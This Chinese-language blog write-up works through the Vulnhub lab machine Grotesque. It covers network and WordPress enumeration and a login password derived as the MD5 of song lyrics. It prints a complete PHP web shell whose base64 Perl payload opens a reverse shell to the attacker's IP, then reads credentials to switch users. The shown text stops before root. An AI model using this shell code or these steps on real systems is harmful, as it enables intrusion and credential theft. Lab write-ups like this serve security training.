<!doctype html><html lang=zh-cn itemscope itemtype=http://schema.org/WebPage><head><meta name=generator content="Hugo 0.121.2"><meta charset=utf-8><title>靶机：Grotesque_vh 1.0.1 · echo</title>
<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=description content="一、信息收集 1 使用 arp-scan 找到靶机 arp-scan --interface eth0 10.9.23.0/24 ┌──(root㉿kali)-[~] └─# arp-scan --interface eth0 10.9.23.0/24 Interface: eth0, type: EN10MB, MAC: 00:0c:29:0a:50:19, IPv4: 10.9.23.111 Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan) 10.9.23.1 50:6f:77:89:ad:99 HUAWEI TECHNOLOGIES CO.,LTD 10.9.23.10 68:da:73:a9:5c:57 (Unknown) …… 10.9.23.155 08:00:27:9c:83:dc"><meta name=keywords content="Hugo,Photography,Computer"><link rel=canonical href=https://www.inecho.cc/zh-cn/2024/01/16/%E9%9D%B6%E6%9C%BAgrotesque_vh-1.0.1/><link rel=stylesheet href=https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css integrity=sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO crossorigin=anonymous><link rel=stylesheet href=https://use.fontawesome.com/releases/v5.2.0/css/all.css integrity=sha384-hWVjflwFxL6sNzntih27bfxkr27PmbbK/iSvJ+a4+0owXq79v+lsFkW54bOGbiDQ crossorigin=anonymous><link rel=stylesheet href=https://www.inecho.cc/css/den.css></head><body><div class=header-container style=background:linear-gradient(rgba(0,0,0,.2),rgba(0,0,0,.2)),url(https://www.inecho.cc/images/background.jpg);background-position:50%;background-size:cover><div class=container><nav class="header-nav navbar navbar-expand-md navbar-dark light-dark"><div class="header-logo navbar-brand"><a class=float-left href=https://www.inecho.cc/zh-cn/><img class="mr20 header-logo-image" src=https://www.inecho.cc/images/globe.svg alt=logo>
echo</a></div><button class=navbar-toggler type=button data-toggle=collapse data-target=#navbarNav aria-controls=navbarNav aria-expanded=false aria-label="Toggle navigation">
<span class=navbar-toggler-icon></span></button><div class="nav-menu collapse navbar-collapse" id=navbarNav><ul class=navbar-nav><li class=nav-item><a class=nav-link href=https://www.inecho.cc/zh-cn/category/ideas/>思考</a></li><li class=nav-item><a class=nav-link href=https://www.inecho.cc/zh-cn/category/photography/>摄影</a></li><li class=nav-item><a class=nav-link href=https://www.inecho.cc/zh-cn/category/computer/>计算机</a></li><li class=nav-item><a class=nav-link href=https://www.inecho.cc/zh-cn/about/>关于</a></li><li class=nav-item><a class=nav-link href=https://www.inecho.cc/en/><i class="fas fa-globe"></i> English</a></li></ul></div></nav></div><div class="container header-wrapper"><div class=row><div class=col-lg-12><div class=header-content><h1 class=header-title>靶机：Grotesque_vh 1.0.1</h1><p class=header-date>作者：
Jack /
2024-01-16
/ 分类：
<a href=https://www.inecho.cc/zh-cn/category/computer/>computer</a></p><div class=header-underline></div><div class=clearfix></div><p class="float-right header-tags"><i class="fas fa-tags" aria-hidden=true></i>
<a href=https://www.inecho.cc/zh-cn/tag/vulnhub/>Vulnhub</a></p></div></div></div></div></div><main><div class="container content"><article><h3 id=一信息收集>一、信息收集</h3><h4 id=1-使用-arp-scan-找到靶机>1 使用 arp-scan 找到靶机</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>arp-scan --interface eth0 10.9.23.0/24
</span></span></code></pre></div><pre tabindex=0><code>┌──(root㉿kali)-[~]
└─# arp-scan --interface eth0 10.9.23.0/24
Interface: eth0, type: EN10MB, MAC: 00:0c:29:0a:50:19, IPv4: 10.9.23.111
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.9.23.1       50:6f:77:89:ad:99       HUAWEI TECHNOLOGIES CO.,LTD
10.9.23.10      68:da:73:a9:5c:57       (Unknown)
……
10.9.23.155     08:00:27:9c:83:dc       PCS Systemtechnik GmbH
……
10.9.23.233     7c:57:58:67:3c:15       HP Inc.
10.9.23.235     90:2e:16:a8:b9:1c       LCFC(HeFei) Electronics Technology co., ltd
10.9.23.238     00:2b:67:39:76:66       LCFC(HeFei) Electronics Technology co., ltd

35 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.052 seconds (124.76 hosts/sec). 34 responded
</code></pre><p>找到靶机：10.9.23.155 08:00:27:9c:83:dc <strong>PCS Systemtechnik GmbH</strong></p><h4 id=2-使用-nmap-对其进行详细扫描>2 使用 nmap 对其进行详细扫描</h4><pre tabindex=0><code>┌──(root㉿kali)-[~]
└─# nmap -A -sV -p- 10.9.23.155 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-16 19:52 CST
Nmap scan report for localhost (10.9.23.155)
Host is up (0.0012s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
66/tcp open  http    WEBrick httpd 1.4.2 (Ruby 2.5.5 (2019-03-15))
|_http-title: Site doesn&#39;t have a title (text/html; charset=utf-8).
|_http-server-header: WEBrick/1.4.2 (Ruby/2.5.5/2019-03-15)
80/tcp open  http    Apache httpd 2.4.38
|_http-title: 404 Not Found
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 08:00:27:9C:83:DC (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: Host: 127.0.1.1

TRACEROUTE
HOP RTT     ADDRESS
1   1.23 ms localhost (10.9.23.155)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.20 seconds
</code></pre><h4 id=3-访问靶机网站>3 访问靶机网站</h4><p>80端口</p><p><img src=img/20240116200028.png alt=image.png></p><p>66端口</p><p><img src=img/20240116200013.png alt=image.png></p><p>最终在66端口下的网页中，我们可以点击<code>here</code>下载到一个压缩包</p><p><img src=img/20240116200929.png alt=image.png></p><p>解压后，在<code>\vvmlist\vvmlist.github.io\_vvmlist</code>文件夹中找到一个文件<code>sense.md</code>，在该文件中可以发现有用的信息</p><p><img src=img/20240116201121.png alt=image.png></p><p>提示我们可以访问<code>http://10.9.23.155/lyricsblog/</code></p><p><img src=img/20240116201640.png alt=image.png></p><h4 id=4-web扫描>4 web扫描</h4><p>使用dirb、gobuster对<code>http://10.9.23.155:66</code>和<code>http://10.9.23.155/lyricsblog/</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1>#dirb</span>
</span></span><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
</span></span><span class=line><span class=cl>└─# dirb http://10.9.23.155:66
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>-----------------
</span></span><span class=line><span class=cl>DIRB v2.22    
</span></span><span class=line><span class=cl>By The Dark Raver
</span></span><span class=line><span class=cl>-----------------
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>START_TIME: Tue Jan <span class=m>16</span> 20:34:05 <span class=m>2024</span>
</span></span><span class=line><span class=cl>URL_BASE: http://10.9.23.155:66/
</span></span><span class=line><span class=cl>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>-----------------
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>GENERATED WORDS: <span class=m>4612</span>                                                          
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>---- Scanning URL: http://10.9.23.155:66/ ----
</span></span><span class=line><span class=cl><span class=o>==</span>&gt; DIRECTORY: http://10.9.23.155:66/assets/                                                                                    
</span></span><span class=line><span class=cl><span class=o>==</span>&gt; DIRECTORY: http://10.9.23.155:66/functions/                                                                                 
</span></span><span class=line><span class=cl>+ http://10.9.23.155:66/index <span class=o>(</span>CODE:200<span class=p>|</span>SIZE:1060253<span class=o>)</span>                                                                           
</span></span><span class=line><span class=cl>+ http://10.9.23.155:66/index.html <span class=o>(</span>CODE:200<span class=p>|</span>SIZE:1060253<span class=o>)</span>                                                                      
</span></span><span class=line><span class=cl>+ http://10.9.23.155:66/LICENSE <span class=o>(</span>CODE:200<span class=p>|</span>SIZE:35149<span class=o>)</span>                                                                             
</span></span><span class=line><span class=cl>---- Entering directory: http://10.9.23.155:66/assets/ ----
</span></span><span class=line><span class=cl><span class=o>(</span>!<span class=o>)</span> WARNING: Directory IS LISTABLE. No need to scan it.                        
</span></span><span class=line><span class=cl>    <span class=o>(</span>Use mode <span class=s1>&#39;-w&#39;</span> <span class=k>if</span> you want to scan it anyway<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>---- Entering directory: http://10.9.23.155:66/functions/ ----
</span></span><span class=line><span class=cl>+ http://10.9.23.155:66/functions/index <span class=o>(</span>CODE:200<span class=p>|</span>SIZE:6442<span class=o>)</span>                                                                    
</span></span><span class=line><span class=cl>+ http://10.9.23.155:66/functions/index.html <span class=o>(</span>CODE:200<span class=p>|</span>SIZE:6442<span class=o>)</span>                
</span></span><span class=line><span class=cl>-----------------
</span></span><span class=line><span class=cl>END_TIME: Tue Jan <span class=m>16</span> 20:38:16 <span class=m>2024</span>
</span></span><span class=line><span class=cl>DOWNLOADED: <span class=m>9224</span> - FOUND: <span class=m>5</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#gobuster</span>
</span></span><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
</span></span><span class=line><span class=cl>└─# gobuster dir -u http://10.9.23.155/lyricsblog/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.txt,.sh   
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>Gobuster v3.6
</span></span><span class=line><span class=cl>by OJ Reeves <span class=o>(</span>@TheColonial<span class=o>)</span> <span class=p>&amp;</span> Christian Mehlmauer <span class=o>(</span>@firefart<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Url:                     http://10.9.23.155/lyricsblog/
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Method:                  GET
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Threads:                 <span class=m>10</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Negative Status codes:   <span class=m>404</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> User Agent:              gobuster/3.6
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Extensions:              php,html,txt,sh
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Timeout:                 <span class=nv>10s</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>Starting gobuster in directory enumeration <span class=nv>mode</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>/.php                 <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 276<span class=o>]</span>
</span></span><span class=line><span class=cl>/.html                <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 276<span class=o>]</span>
</span></span><span class=line><span class=cl>/index.php            <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 0<span class=o>]</span> <span class=o>[</span>--&gt; http://10.9.23.155/lyricsblog/<span class=o>]</span>
</span></span><span class=line><span class=cl>/wp-content           <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 326<span class=o>]</span> <span class=o>[</span>--&gt; http://10.9.23.155/lyricsblog/wp-content/<span class=o>]</span>
</span></span><span class=line><span class=cl>/wp-login.php         <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 5731<span class=o>]</span>
</span></span><span class=line><span class=cl>/license.txt          <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 19915<span class=o>]</span>
</span></span><span class=line><span class=cl>/wp-includes          <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 327<span class=o>]</span> <span class=o>[</span>--&gt; http://10.9.23.155/lyricsblog/wp-includes/<span class=o>]</span>
</span></span><span class=line><span class=cl>/readme.html          <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 7399<span class=o>]</span>
</span></span><span class=line><span class=cl>/wp-trackback.php     <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 135<span class=o>]</span>
</span></span><span class=line><span class=cl>/wp-admin             <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 324<span class=o>]</span> <span class=o>[</span>--&gt; http://10.9.23.155/lyricsblog/wp-admin/<span class=o>]</span>
</span></span><span class=line><span class=cl>/xmlrpc.php           <span class=o>(</span>Status: 405<span class=o>)</span> <span class=o>[</span>Size: 42<span class=o>]</span>
</span></span><span class=line><span class=cl>/.html                <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 276<span class=o>]</span>
</span></span><span class=line><span class=cl>/.php                 <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 276<span class=o>]</span>
</span></span><span class=line><span class=cl>/wp-signup.php        <span class=o>(</span>Status: 302<span class=o>)</span> <span class=o>[</span>Size: 0<span class=o>]</span> <span class=o>[</span>--&gt; http://10.9.23.155/lyricsblog/wp-login.php?action<span class=o>=</span>register<span class=o>]</span>
</span></span><span class=line><span class=cl>Progress: <span class=m>1102800</span> / <span class=m>1102805</span> <span class=o>(</span>100.00%<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl><span class=nv>Finished</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span></code></pre></div><p>没有扫描到什么关键有用的信息</p><p>从之前收集的信息可知这是个基于wordpress框架搭建的网站，所以我们可以再用<code>wpscan</code>工具扫一下</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1>#基本扫描</span>
</span></span><span class=line><span class=cl>wpscan --url http://10.9.23.155/lyricsblog/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#漏洞扫描</span>
</span></span><span class=line><span class=cl>wpscan --url http://10.9.23.155/lyricsblog/ --enumerate vp
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#用户枚举</span>
</span></span><span class=line><span class=cl>wpscan --url http://10.9.23.155/lyricsblog/ --enumerate u
</span></span></code></pre></div><p><img src=img/20240116202849.png alt=image.png></p><p>发现一个用户<code>erdalkomurcu</code>，接下来我们去找密码</p><h4 id=5-密码破解>5 密码破解</h4><p>最后根据wordpress登录页面的提示</p><p><img src=img/20240116212137.png alt=image.png></p><p>在<code>http://10.9.23.155/lyricsblog/</code>网页中找到了，密码为计算下图歌词MD5的值</p><p><img src=img/20240116205438.png alt=image.png></p><p>Kali中生成一个文件，将歌词复制进去，再使用md5sum计算MD5的值</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
</span></span><span class=line><span class=cl>└─# vim token.txt 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
</span></span><span class=line><span class=cl>└─# cat token.txt 
</span></span><span class=line><span class=cl>Çaresiz derdimin sebebi belli
</span></span><span class=line><span class=cl>Dermanı yaramda arama doktor
</span></span><span class=line><span class=cl>Şifa bulmaz gönlüm senin elinden
</span></span><span class=line><span class=cl>Boşuna benimle uğraşma doktor
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Aşk yarasıdır bu ilaç kapatmaz
</span></span><span class=line><span class=cl>Derdin teselli beni avutmaz
</span></span><span class=line><span class=cl>Dermanı yardadır sende bulunmaz
</span></span><span class=line><span class=cl>Boşuna benimle uğraşma doktor
</span></span><span class=line><span class=cl>Dokunma benim gönül yarama
</span></span><span class=line><span class=cl>Dokunma doktor
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Bedenimde değil kalbimde derdim
</span></span><span class=line><span class=cl>Tek alışkanlığım bir zalim sevdim
</span></span><span class=line><span class=cl>Sen çekil yanımdan sevdiğim gelsin
</span></span><span class=line><span class=cl>Boşuna zamanı harcama doktor
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
</span></span><span class=line><span class=cl>└─# md5sum token.txt 
</span></span><span class=line><span class=cl>bc78c6ab38e114d6135409e44f7cdda2  token.txt
</span></span></code></pre></div><p>同时在wordpress登录页<code>http://IP/lyricsblog/wp-login.php</code>的左上角发现密码大写提示</p><p><img src=img/20240116212819.png alt=image.png></p><p>使用账号密码登录</p><pre tabindex=0><code>账号:erdalkomurcu
密码:BC78C6AB38E114D6135409E44F7CDDA2
</code></pre><p>登录成功</p><p><img src=img/20240116213237.png alt=image.png></p><h3 id=二wordpress漏洞利用>二、wordpress漏洞利用</h3><p>根据之前打过的靶机[[2001-Lazysysadmin]]可知，wordpress中存在反弹shell漏洞</p><p>随便找一个PHP页面写入反弹shell</p><p><img src=img/20240116222655.png alt=image.png></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>which</span><span class=p>(</span><span class=nv>$pr</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nv>$path</span> <span class=o>=</span> <span class=nx>execute</span><span class=p>(</span><span class=s2>&#34;which </span><span class=si>$pr</span><span class=s2>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=p>(</span><span class=nv>$path</span> <span class=o>?</span> <span class=nv>$path</span> <span class=o>:</span> <span class=nv>$pr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>execute</span><span class=p>(</span><span class=nv>$cfe</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nv>$res</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=nv>$cfe</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span><span class=p>(</span><span class=nx>function_exists</span><span class=p>(</span><span class=s1>&#39;exec&#39;</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=o>@</span><span class=nx>exec</span><span class=p>(</span><span class=nv>$cfe</span><span class=p>,</span><span class=nv>$res</span><span class=p>);</span>
</span></span><span class=line><span class=cl>			<span class=nv>$res</span> <span class=o>=</span> <span class=nx>join</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span><span class=nv>$res</span><span class=p>);</span>
</span></span><span class=line><span class=cl>			<span class=p>}</span> 
</span></span><span class=line><span class=cl>			<span class=k>elseif</span><span class=p>(</span><span class=nx>function_exists</span><span class=p>(</span><span class=s1>&#39;shell_exec&#39;</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=nv>$res</span> <span class=o>=</span> <span class=o>@</span><span class=nx>shell_exec</span><span class=p>(</span><span class=nv>$cfe</span><span class=p>);</span>
</span></span><span class=line><span class=cl>			<span class=p>}</span> <span class=k>elseif</span><span class=p>(</span><span class=nx>function_exists</span><span class=p>(</span><span class=s1>&#39;system&#39;</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>ob_start</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>system</span><span class=p>(</span><span class=nv>$cfe</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$res</span> <span class=o>=</span> <span class=o>@</span><span class=nx>ob_get_contents</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>ob_end_clean</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>elseif</span><span class=p>(</span><span class=nx>function_exists</span><span class=p>(</span><span class=s1>&#39;passthru&#39;</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>ob_start</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>passthru</span><span class=p>(</span><span class=nv>$cfe</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$res</span> <span class=o>=</span> <span class=o>@</span><span class=nx>ob_get_contents</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>ob_end_clean</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>elseif</span><span class=p>(</span><span class=o>@</span><span class=nx>is_resource</span><span class=p>(</span><span class=nv>$f</span> <span class=o>=</span> <span class=o>@</span><span class=nx>popen</span><span class=p>(</span><span class=nv>$cfe</span><span class=p>,</span><span class=s2>&#34;r&#34;</span><span class=p>)))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl><span class=nv>$res</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>while</span><span class=p>(</span><span class=o>!@</span><span class=nx>feof</span><span class=p>(</span><span class=nv>$f</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl><span class=nv>$res</span> <span class=o>.=</span> <span class=o>@</span><span class=nx>fread</span><span class=p>(</span><span class=nv>$f</span><span class=p>,</span><span class=mi>1024</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>pclose</span><span class=p>(</span><span class=nv>$f</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>return</span> <span class=nv>$res</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>cf</span><span class=p>(</span><span class=nv>$fname</span><span class=p>,</span><span class=nv>$text</span><span class=p>){</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nv>$fp</span><span class=o>=@</span><span class=nx>fopen</span><span class=p>(</span><span class=nv>$fname</span><span class=p>,</span><span class=s1>&#39;w&#39;</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>fputs</span><span class=p>(</span><span class=nv>$fp</span><span class=p>,</span><span class=o>@</span><span class=nx>base64_decode</span><span class=p>(</span><span class=nv>$text</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>fclose</span><span class=p>(</span><span class=nv>$fp</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$yourip</span> <span class=o>=</span> <span class=s2>&#34;10.9.23.111&#34;</span><span class=p>;</span> <span class=c1>#kali的IP地址
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$yourport</span> <span class=o>=</span> <span class=s1>&#39;4444&#39;</span><span class=p>;</span> <span class=c1>#nc监听端口
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$usedb</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span><span class=s1>&#39;perl&#39;</span><span class=o>=&gt;</span><span class=s1>&#39;perl&#39;</span><span class=p>,</span><span class=s1>&#39;c&#39;</span><span class=o>=&gt;</span><span class=s1>&#39;c&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$back_connect</span><span class=o>=</span><span class=s2>&#34;IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj&#34;</span><span class=o>.</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR&#34;</span><span class=o>.</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT&#34;</span><span class=o>.</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI&#34;</span><span class=o>.</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi&#34;</span><span class=o>.</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl&#34;</span><span class=o>.</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nx>cf</span><span class=p>(</span><span class=s1>&#39;/tmp/.bc&#39;</span><span class=p>,</span><span class=nv>$back_connect</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$res</span> <span class=o>=</span> <span class=nx>execute</span><span class=p>(</span><span class=nx>which</span><span class=p>(</span><span class=s1>&#39;perl&#39;</span><span class=p>)</span><span class=o>.</span><span class=s2>&#34; /tmp/.bc </span><span class=si>$yourip</span><span class=s2> </span><span class=si>$yourport</span><span class=s2> &amp;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err> 
</span></span></span></code></pre></div><p>保存后现在kali中使用nc监听端口，然后浏览器访问写入反弹shell的页面</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nc -lvvp <span class=m>4444</span>
</span></span></code></pre></div><p><img src=img/20240116223005.png alt=image.png></p><p>反弹进入后可以使用<code>python -c "import pty;pty.spawn('/bin/bash')"</code> 获取伪终端</p><h3 id=三提权>三、提权</h3><p>进来后，先随便找找文件</p><p>在<code>/var/www/html/lyricsblog/</code>目录下，发现wordpress配置文件<code>wp-config.php</code>中有账号和密码</p><p><img src=img/20240116223802.png alt=image.png></p><p>使用<code>cat /etc/passwd</code>命令发现包含<code>raphael</code>用户</p><p><img src=img/20240116223929.png alt=image.png></p><p>尝试登录<code>raphael</code>用户</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>www-data@grotesque:/var/www/html/lyricsblog$ su raphael
</span></span><span class=line><span class=cl>su raphael
</span></span><span class=line><span class=cl>Password: _double_trouble_
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>raphael@grotesque:/var/www/html/lyricsblog$ <span class=nb>cd</span> /
</span></span><span class=line><span class=cl><span class=nb>cd</span> /
</span></span><span class=line><span class=cl>raphael@grotesque:/$ id
</span></span><span class=line><span class=cl>id
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>1000<span class=o>(</span>raphael<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>1000<span class=o>(</span>raphael<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>1000<span class=o>(</span>raphael<span class=o>)</span>
</span></span><span class=line><span class=cl>raphael@grotesque:/$ uname -a
</span></span><span class=line><span class=cl>uname -a
</span></span><span class=line><span class=cl>Linux grotesque 4.19.0-13-amd64 <span class=c1>#1 SMP Debian 4.19.160-2 (2020-11-28) x86_64 GNU/Linux</span>
</span></span><span class=line><span class=cl>raphael@grotesque:/$ sudo -l
</span></span><span class=line><span class=cl>sudo -l
</span></span><span class=line><span class=cl>bash: sudo: <span class=nb>command</span> not found
</span></span><span class=line><span class=cl>raphael@grotesque:/$
